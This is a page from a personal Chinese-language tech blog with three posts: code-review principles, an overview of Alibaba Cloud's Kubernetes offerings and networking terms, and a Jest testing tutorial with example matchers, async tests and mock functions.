<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Ccw&#39;s Blogs</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Ccw&#39;s Blogs">
<meta property="og:url" content="http://example.com/page/3/index.html">
<meta property="og:site_name" content="Ccw&#39;s Blogs">
<meta property="og:locale">
<meta property="article:author" content="ccw">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Ccw's Blogs" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Ccw&#39;s Blogs</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Suche"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Suche"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-Code Review" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/06/21/Code%20Review/" class="article-date">
  <time class="dt-published" datetime="2021-06-21T00:10:00.000Z" itemprop="datePublished">2021-06-21</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/06/21/Code%20Review/">Code Review</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="Code-Review"><a href="#Code-Review" class="headerlink" title="Code Review"></a>Code Review</h2><h3 id="标准"><a href="#标准" class="headerlink" title="标准"></a>标准</h3><p>代码审核的目标，是为了让整个项目的代码库，随着时间推移，质量有所进步，而不是发生了退化；</p>
<p>为了达到这个目标，需要做一些取舍：</p>
<ul>
<li>小步迭代胜于追求完美主义；</li>
<li>确保代码质量不退化，是审核人员的责任；</li>
<li>审核人员对所审核的代码拥有责任和相同的所有权；</li>
</ul>
<p>原则：只要所提交的代码改进了代码库的质量，即使该代码不完美，也应该审核通过；</p>
<p>质量改进维度：</p>
<pre><code>* 更容易维护；
* 更容易阅读；
* 更容易理解；
</code></pre>
<h4 id="经验交流"><a href="#经验交流" class="headerlink" title="经验交流"></a>经验交流</h4><p>代码走查同时是一种交流经验的机会，但不要强制遵守某种经验。可以在注释中某些更好的做法，但同时备注“仅供参考”；</p>
<h4 id="原则"><a href="#原则" class="headerlink" title="原则"></a>原则</h4><ul>
<li>事实和数据优于看法和偏好；</li>
<li>如果有代码风格规定的话，就遵守规定；没有规定的部分，则按作者的偏好；</li>
<li>软件设计不属于个人偏好的范畴，而应该遵守基本的原则，除非作者能够有充足的理由，能够证明其合理性；</li>
</ul>
<h4 id="处理冲突"><a href="#处理冲突" class="headerlink" title="处理冲突"></a>处理冲突</h4><ul>
<li>当出现冲突时，双方应根据既有原则达成一致意见；</li>
<li>如果有困难，则向上汇报，由其他人开会讨论协助判断；</li>
</ul>
<h3 id="走查什么"><a href="#走查什么" class="headerlink" title="走查什么"></a>走查什么</h3><h4 id="设计"><a href="#设计" class="headerlink" title="设计"></a>设计</h4><ul>
<li>是否设计良好？</li>
<li>模块之间是否高内聚，低耦合？</li>
</ul>
<h4 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h4><ul>
<li>功能是否能如预期那样工作？</li>
</ul>
<h4 id="复杂性"><a href="#复杂性" class="headerlink" title="复杂性"></a>复杂性</h4><p>是否过于复杂了，复杂的标准为“无法快速看懂代码要做什么”；主要包括以下几个层面：</p>
<ul>
<li>行、函数、类；</li>
<li>是否存在过度工程？</li>
</ul>
<h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><ul>
<li>是否包含单元测试、集成测试、端到端测试？</li>
<li>测试本身是否正确？</li>
</ul>
<h4 id="命名"><a href="#命名" class="headerlink" title="命名"></a>命名</h4><ul>
<li>命名是否合适，让人能够直接从名称看出意图或内容？</li>
</ul>
<h4 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h4><ul>
<li>注释是否用来说明原因，而不是用来描述动作？</li>
<li>是否为正则和复杂算法写了注释？</li>
<li>注释是否和文档有所区分，文档用来详细描述代码意图、使用方法、最终效果等；</li>
</ul>
<h4 id="风格"><a href="#风格" class="headerlink" title="风格"></a>风格</h4><ul>
<li>尽量使用既定的风格指南，除非有特殊原因；</li>
</ul>
<h4 id="文档"><a href="#文档" class="headerlink" title="文档"></a>文档</h4><ul>
<li>如果代码涉及外部使用方式的变化，则检查是否更新了文档（增加或者删除）；</li>
</ul>
<h4 id="每一行"><a href="#每一行" class="headerlink" title="每一行"></a>每一行</h4><ul>
<li>走查每一行代码，而不是假设某些代码能够正确运行，而忽略对它们的走查；</li>
<li>如果觉得某些代码过于复杂，自己没有把握确保它们的正确性，则应请求其他更有经验和能力的成员的帮助；</li>
<li>如果代码过于难懂，就要求作者解释它们；</li>
</ul>
<h4 id="宏观视角"><a href="#宏观视角" class="headerlink" title="宏观视角"></a>宏观视角</h4><ul>
<li>尝试站在更宏观的角度来思考代码变更可能带来的影响，而不是仅仅看局部出现变化的代码；</li>
<li>思考新的代码，是否让整个项目的代码质量退化了？如果是的话，应即时修正它；因为大退化总是由无数小退化累积起来的；</li>
</ul>
<h4 id="不吝赞美"><a href="#不吝赞美" class="headerlink" title="不吝赞美"></a>不吝赞美</h4><ul>
<li>当发现某些代码写得很好时，不要吝啬自己的赞美，在注释中把自己的赞美表达出来；</li>
</ul>
<h3 id="走查步骤"><a href="#走查步骤" class="headerlink" title="走查步骤"></a>走查步骤</h3><ul>
<li>先宏观的了解新提交的代码的目标（想要做些什么），并思考目标是否有意义，如果没有意义，就诚恳的提出，并给出新目标（如果这种情况经常发生，说明团队缺乏沟通，导致成员的工作目标不一致，应该改进）；</li>
<li>查看提交中发生最大变化的位置；如果发现设计问题，应该第一时间给作者指出，以免对方在错误的基础上继续走太远；</li>
<li>弄清楚目标后，按顺序浏览实现目标的文件；如果可以的话，看主要代码前，先看一下测试，也会对目标的了解提供帮助；</li>
</ul>
<h3 id="走查速度"><a href="#走查速度" class="headerlink" title="走查速度"></a>走查速度</h3><ul>
<li>走查的速度应该越快越好，因为反馈的越快，它带来的负面效果越小，正面效果越大；</li>
<li>走查的时间不应越过一天；一般来说，今天提交的代码，第二天应该给出反馈；</li>
<li>如果自己当前正在写代码，则不应停下来去做走查，而应该是当自己手头的任务完成后，再走查；</li>
<li>如果自己无法在1天内给出回复，则应该救助其他同事帮忙走查，而不是拖延；</li>
<li>如果提交走查的代码量很大，则应要求作者将它们进行拆分成多个提交；</li>
</ul>
<h3 id="如何写走查意见"><a href="#如何写走查意见" class="headerlink" title="如何写走查意见"></a>如何写走查意见</h3><ul>
<li>保持谦逊的态度；</li>
<li>说明理由；</li>
<li>鼓励作者简化代码，或者添加注释；</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/06/21/Code%20Review/" data-id="cm1c2i80b0007pkhpb6lq0elp" data-title="Code Review" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%BD%AF%E4%BB%B6/" rel="tag">软件</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-阿里云的 Kubernetes" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/04/09/%E9%98%BF%E9%87%8C%E4%BA%91%E7%9A%84%20Kubernetes/" class="article-date">
  <time class="dt-published" datetime="2021-04-09T01:55:00.000Z" itemprop="datePublished">2021-04-09</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/04/09/%E9%98%BF%E9%87%8C%E4%BA%91%E7%9A%84%20Kubernetes/">阿里云的 Kubernetes</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="简单介绍"><a href="#简单介绍" class="headerlink" title="简单介绍"></a>简单介绍</h2><p>三个版本</p>
<ul>
<li>专有版：自建 Master 和 Worker 节点，适用于所有场景，更加细颗粒度的管理；承担两种节点的费用；</li>
<li>托管版：自建 Worker  节点，适用于所有场景，无须管理 Master 节点；承担工作节点的费用；</li>
<li>Serverless 版：无须建任何节点，按容器实例的使用资源数量和时长收费；适用于批量任务、突发扩容、CI&#x2F;CD 场景；</li>
</ul>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/202409211717272.png"></p>
<blockquote>
<p>问：什么是 NAT 网关？</p>
<p>答：它是构成 VPC 虚拟专用网络的一个核心组成部分；机器实例通过网关对外提供服务，并且接受外部的服务请求，它的作用看起来很像局域网中的路由器；路由器管理着内部的电脑，以统一的 IP 地址对外访问，同时也接收外部的请求，并转发给相应的机器实例；</p>
<p>NAT 下面还细分为 SNAT 和 DNAT 两种场景，前者为内部的机器提供访问外部网络的服务；后者则暴露内部的机器，接受外部的请求，对外提供服务；</p>
</blockquote>
<blockquote>
<p>问：什么是 EIP？</p>
<p>答：弹性公网 IP，Elastic IP Address；它可以为 NAT 提供物理 IP 地址，这样 NAT 才能正常工作；</p>
</blockquote>
<blockquote>
<p> 问：什么是公网 SLB？</p>
<p> 答：Service Load Balance，负载均衡服务；用来将公网流量平均分发给多个机器实例；需要创建一个监听实例来实现；感觉相当于创建了一台部署了 Nginx 的实例一样；</p>
</blockquote>
<blockquote>
<p>问：什么是线下 IDC</p>
<p>答：Internet Data Center，互联网数据中心，名称看着很高大上，其实就是运营商或者一些第三方机构建立的机房，出租给企业使用；企业可以在机房中托管机器；</p>
</blockquote>
<blockquote>
<p>问：什么是 ENI?</p>
<p>答：ENI，elastic network interface，弹性网络接口，说白了，就是虚拟网卡；在配置局域网络时，内部的 IP  地址其实是指向某个虚拟网卡的；因此，当某台机器实例出现故障时，可以将 ENI 跟原机器解绑，然后绑定到新的机器实例中，这样可以在不改变原有的路由配置关系，对外部来说，一切都是透明的，仍然访问旧的 IP，但流量在不知不觉中，被引到了新的机器上面；</p>
</blockquote>
<blockquote>
<p>问：什么是安全组？</p>
<p>答：安全组是一种虚拟的防火墙，通过配置一些安全组的规则，来实现对流量的访问控制；</p>
</blockquote>
<blockquote>
<p>问：什么是 ECI？</p>
<p>答：Elastic Container Instance，弹性容器实例</p>
</blockquote>
<h2 id="命令行工具"><a href="#命令行工具" class="headerlink" title="命令行工具"></a>命令行工具</h2><p><img src="https://static-aliyun-doc.oss-accelerate.aliyuncs.com/assets/img/zh-CN/5862000161/p210946.png" alt="img"></p>
<h3 id="价格"><a href="#价格" class="headerlink" title="价格"></a>价格</h3><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/202409211719693.png"></p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/202409211719204.png"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/04/09/%E9%98%BF%E9%87%8C%E4%BA%91%E7%9A%84%20Kubernetes/" data-id="cm1c2i81p005tpkhp4spzav7a" data-title="阿里云的 Kubernetes" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/kubernetes/" rel="tag">kubernetes</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%BD%AF%E4%BB%B6/" rel="tag">软件</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Jest" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/02/07/Jest/" class="article-date">
  <time class="dt-published" datetime="2021-02-07T03:49:00.000Z" itemprop="datePublished">2021-02-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/02/07/Jest/">Jest</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>Jest 是一个 javacript 测试框架，特点是简单易上手</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install jest</span><br></pre></td></tr></table></figure>



<blockquote>
<p>需要 node 9.2 以上版本，因为 9.2 以下的版本不支持 try…catch 语法，运行时会报语法错误</p>
</blockquote>
<h2 id="Matcher"><a href="#Matcher" class="headerlink" title="Matcher"></a>Matcher</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 字面值使用 toBe</span></span><br><span class="line">expect(<span class="number">2</span> + <span class="number">2</span>).toBe(<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对象使用 toEqual</span></span><br><span class="line"><span class="type">const</span> <span class="variable">data</span> <span class="operator">=</span> &#123;one: <span class="number">1</span>&#125;;</span><br><span class="line">data[<span class="string">&#x27;two&#x27;</span>] = <span class="number">2</span>;</span><br><span class="line">expect(data).toEqual(&#123;one: <span class="number">1</span>, two: <span class="number">2</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 取反使用 not</span></span><br><span class="line">expect(<span class="number">4</span>).not.toBe(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 字符串可正则匹配</span></span><br><span class="line">expect(<span class="string">&#x27;team&#x27;</span>).not.toMatch(/I/);</span><br><span class="line">expect(<span class="string">&#x27;Christoph&#x27;</span>).toMatch(/stop/);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数组可判断是否包含</span></span><br><span class="line">expect([<span class="number">1</span>, <span class="number">2</span>]).toContain(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<h2 id="异步处理"><a href="#异步处理" class="headerlink" title="异步处理"></a>异步处理</h2><h3 id="回调模式"><a href="#回调模式" class="headerlink" title="回调模式"></a>回调模式</h3><p>使用 done 来处理回调模式的异步函数</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">test</span>(<span class="string">&#x27;callback pattern&#x27;</span>, <span class="function"><span class="params">done</span> =&gt;</span> &#123;</span><br><span class="line">   <span class="keyword">function</span> <span class="title function_">callback</span>(<span class="params">data</span>) &#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="title function_">expect</span>(data).<span class="title function_">toBe</span>(<span class="string">&#x27;something&#x27;</span>);</span><br><span class="line">           <span class="title function_">done</span>();</span><br><span class="line">       &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">           <span class="title function_">done</span>(error);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="title function_">fetchData</span>(callback);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h3 id="Promise-模式"><a href="#Promise-模式" class="headerlink" title="Promise 模式"></a>Promise 模式</h3><p>返回 Promise 即可；</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 注意此处不要漏了写 return，不然实际返回的是 undefined；</span></span><br><span class="line"><span class="title function_">test</span>(<span class="string">&quot;promise pattern&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">fetchData</span>().<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">expect</span>(data).<span class="title function_">toBe</span>(<span class="string">&#x27;something&#x27;</span>);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h3 id="Async-Await-模式"><a href="#Async-Await-模式" class="headerlink" title="Async&#x2F;Await 模式"></a>Async&#x2F;Await 模式</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">test</span>(<span class="string">&#x27;Async pattern&#x27;</span>, <span class="title function_">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> data = <span class="keyword">await</span> <span class="title function_">fetchData</span>();</span><br><span class="line">    <span class="title function_">expect</span>(data).<span class="title function_">toBe</span>(<span class="string">&#x27;something&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 带异常的情况</span></span><br><span class="line"><span class="title function_">test</span>(<span class="string">&#x27;Async pattern with error&#x27;</span>, <span class="title function_">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> data = <span class="keyword">await</span> <span class="title function_">fetchData</span>();</span><br><span class="line">        <span class="title function_">expect</span>(data).<span class="title function_">toBe</span>(<span class="string">&#x27;something&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        <span class="title function_">expect</span>(error).<span class="title function_">toMatch</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h2 id="初始化和清理"><a href="#初始化和清理" class="headerlink" title="初始化和清理"></a>初始化和清理</h2><h3 id="重复初始化"><a href="#重复初始化" class="headerlink" title="重复初始化"></a>重复初始化</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">beforeEach</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">initDB</span>(); <span class="comment">// 如果 initDB 函数是异步的，则应为 return initDB()；</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="title function_">afterEach</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">clearDB</span>();</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h3 id="一次性初始化"><a href="#一次性初始化" class="headerlink" title="一次性初始化"></a>一次性初始化</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">beforeAll</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">initDB</span>();</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="title function_">afterAll</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">clearDB</span>();</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h3 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h3><p>使用 describe 来建立块的作用域</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">beforeEach</span>(<span class="string">&#x27;parent&#x27;</span>);</span><br><span class="line"><span class="title function_">afterEach</span>(<span class="string">&#x27;parent&#x27;</span>);</span><br><span class="line"><span class="title function_">test</span>(<span class="string">&#x27;parent1&#x27;</span>);</span><br><span class="line"><span class="title function_">test</span>(<span class="string">&#x27;parent2&#x27;</span>);</span><br><span class="line"><span class="title function_">describe</span>(<span class="string">&#x27;block&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">beforeEach</span>(<span class="string">&#x27;child&#x27;</span>);</span><br><span class="line">    <span class="title function_">afterEach</span>(<span class="string">&#x27;child&#x27;</span>);</span><br><span class="line">    <span class="title function_">test</span>(<span class="string">&#x27;child1&#x27;</span>);</span><br><span class="line">    <span class="title function_">test</span>(<span class="string">&#x27;child2&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 注意：parent 的 beforeEach 会在 child 的 beforeEach 之前先执行；同时 parent 的 afterEach 在 child 的 afterEach 之后执行；</span></span><br></pre></td></tr></table></figure>

<h3 id="顺序控制"><a href="#顺序控制" class="headerlink" title="顺序控制"></a>顺序控制</h3><p>所有的 describe 将在所有的 test 之前先执行；</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">describe</span>(<span class="string">&#x27;outer&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;outer a&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="title function_">describe</span>(<span class="string">&#x27;inner 1&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;inner 1&#x27;</span>);</span><br><span class="line">        <span class="title function_">test</span>(<span class="string">&#x27;test 1&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;test 1 inner 1&#x27;</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;outer b&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="title function_">test</span>(<span class="string">&#x27;test 1&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;test 1 outer&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    <span class="title function_">describe</span>(<span class="string">&#x27;inner 2&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;inner 2&#x27;</span>);</span><br><span class="line">        <span class="title function_">test</span>(<span class="string">&#x27;test 2&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;test 2 inner 2&#x27;</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;outer c&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 实际的输出顺序如下：</span></span><br><span class="line"><span class="comment">// outer a</span></span><br><span class="line"><span class="comment">// inner 1</span></span><br><span class="line"><span class="comment">// outer b</span></span><br><span class="line"><span class="comment">// inner 2</span></span><br><span class="line"><span class="comment">// outer c</span></span><br><span class="line"><span class="comment">// test 1 inner 1</span></span><br><span class="line"><span class="comment">// test 1 outer</span></span><br><span class="line"><span class="comment">// test 2 inner 2</span></span><br></pre></td></tr></table></figure>

<h3 id="单例测试"><a href="#单例测试" class="headerlink" title="单例测试"></a>单例测试</h3><p>test.only 方法可以使得只有该测试用例被执行；如果多例同时测试失败，但是单例测试可以成功，则说明某两个测试用例之间存在共享的变量，二者在测试过程中出现相互干扰的情况；</p>
<h2 id="Mock-函数"><a href="#Mock-函数" class="headerlink" title="Mock 函数"></a>Mock 函数</h2><p>mock 函数扮演拦截的作用，当在代码中对某个实际的函数进行调用时，拦截该调用，触发提前写好的 mock 函数，返回预设的结果；</p>
<h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> mockFunc = jest.<span class="title function_">fn</span>(<span class="function"><span class="params">x</span> =&gt;</span> <span class="number">42</span> + x);</span><br><span class="line"><span class="title function_">forEach</span>([<span class="number">0</span>, <span class="number">1</span>], mockFunc);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查 mockFunc 是否被调用了两次</span></span><br><span class="line"><span class="title function_">expect</span>(mockFunc.<span class="property">mock</span>.<span class="property">calls</span>.<span class="property">length</span>).<span class="title function_">toBe</span>(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查第一次调用时传入的参数值是否为 0</span></span><br><span class="line"><span class="title function_">expect</span>(mockFunc.<span class="property">mock</span>.<span class="property">calls</span>[<span class="number">0</span>][<span class="number">0</span>]).<span class="title function_">toBe</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查第二次调用时传入的参数值是否为 1</span></span><br><span class="line"><span class="title function_">expect</span>(mockFunc.<span class="property">mock</span>.<span class="property">calls</span>[<span class="number">1</span>][<span class="number">0</span>]).<span class="title function_">toBe</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查第一次调用时的返回值是否为 42</span></span><br><span class="line"><span class="title function_">expect</span>(mockFunc.<span class="property">mock</span>.<span class="property">results</span>[<span class="number">0</span>].<span class="property">value</span>).<span class="title function_">toBe</span>(<span class="number">42</span>);</span><br></pre></td></tr></table></figure>

<h3 id="模拟返回值"><a href="#模拟返回值" class="headerlink" title="模拟返回值"></a>模拟返回值</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> mock = jest.<span class="title function_">fn</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">mock</span>());</span><br><span class="line"><span class="comment">// &gt; undefined</span></span><br><span class="line"></span><br><span class="line">mock.<span class="title function_">mockReturnValueOnce</span>(<span class="number">10</span>).<span class="title function_">mockReturnValueOnce</span>(<span class="string">&#x27;x&#x27;</span>).<span class="title function_">mockReturnValue</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">mock</span>(), <span class="title function_">mock</span>(), <span class="title function_">mock</span>(), <span class="title function_">mock</span>());</span><br><span class="line"><span class="comment">// &gt; 10, &#x27;x&#x27;, true, true</span></span><br></pre></td></tr></table></figure>

<p>模拟函数在多次连续调用时，返回不同的值</p>
